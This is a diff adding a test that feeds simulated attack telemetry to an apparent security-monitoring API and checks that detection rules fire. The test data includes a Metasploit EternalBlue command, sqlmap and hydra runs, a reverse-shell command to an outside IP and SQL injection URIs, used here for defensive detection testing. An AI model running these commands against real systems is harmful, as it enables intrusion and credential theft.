@@ -128,3 +128,93 @@ def test_copilot_friendly_advisor_responses(client_auth):
     assert res3.status_code == 200
     r3 = res3.json()["response"]
     assert "phishing" in r3.lower() or "சந்தேகத்திற்குரிய" in r3
+
+def test_advanced_hacking_tool_detections(client_auth):
+    client, headers = client_auth
+    
+    # 1. Test Nmap Scan Ingestion
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "windows_sysmon",
+        "host": "ast-001",
+        "log_data": {
+            "CommandLine": "nmap -sS -A -T4 10.0.1.10",
+            "user": "Administrator"
+        }
+    })
+    assert res.status_code == 200
+    assert "Advanced Network Scan Detected" in res.json()["rule"]
+    
+    # 2. Test Metasploit Ingestion
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "windows_sysmon",
+        "host": "ast-001",
+        "log_data": {
+            "CommandLine": "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; run\"",
+            "user": "Administrator"
+        }
+    })
+    assert res.status_code == 200
+    assert "Metasploit Exploitation Framework Detected" in res.json()["rule"]
+    
+    # 3. Test SQLmap Ingestion
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "windows_sysmon",
+        "host": "ast-001",
+        "log_data": {
+            "CommandLine": "python sqlmap.py -u \"http://10.0.2.50/login.php?user=1\" --dbs --batch",
+            "user": "Administrator"
+        }
+    })
+    assert res.status_code == 200
+    assert "SQLmap Automated SQL Injection Attack Detected" in res.json()["rule"]
+    
+    # 4. Test Hydra Ingestion
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "windows_sysmon",
+        "host": "ast-001",
+        "log_data": {
+            "CommandLine": "hydra -l admin -P wordlist.txt ssh://10.0.2.15",
+            "user": "Administrator"
+        }
+    })
+    assert res.status_code == 200
+    assert "Automated Credential Brute-Force/Crack Tool Detected" in res.json()["rule"]
+
+    # 5. Test Alien Program / RAT Ingestion (Camera Trigger)
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "windows_sysmon",
+        "host": "ast-001",
+        "log_data": {
+            "CommandLine": "C:\\Users\\Public\\alien_program.exe --payload reverse_shell --connect 45.142.212.100:4444",
+            "user": "Administrator"
+        }
+    })
+    assert res.status_code == 200
+    assert "Alien Program/RAT Injection Detected" in res.json()["rule"]
+    assert "CAMERA" in res.json()["description"]
+
+    # 6. Test SQLmap via Proxy Log
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "proxy",
+        "host": "ast-001",
+        "log_data": {
+            "uri": "/item.php?id=5",
+            "user_agent": "sqlmap/1.8.2#stable (https://sqlmap.org)",
+            "src_ip": "192.168.1.15"
+        }
+    })
+    assert res.status_code == 200
+    assert "SQLmap Automated SQL Injection Attack Detected" in res.json()["rule"]
+
+    # 7. Test Manual SQL Injection via Proxy Log
+    res = client.post("/api/v1/ingest/telemetry", json={
+        "source_type": "proxy",
+        "host": "ast-001",
+        "log_data": {
+            "uri": "/item.php?id=5%20UNION%20SELECT%20NULL,database(),version()",
+            "src_ip": "192.168.1.15"
+        }
+    })
+    assert res.status_code == 200
+    assert "SQL Injection Attempt Detected" in res.json()["rule"]
+
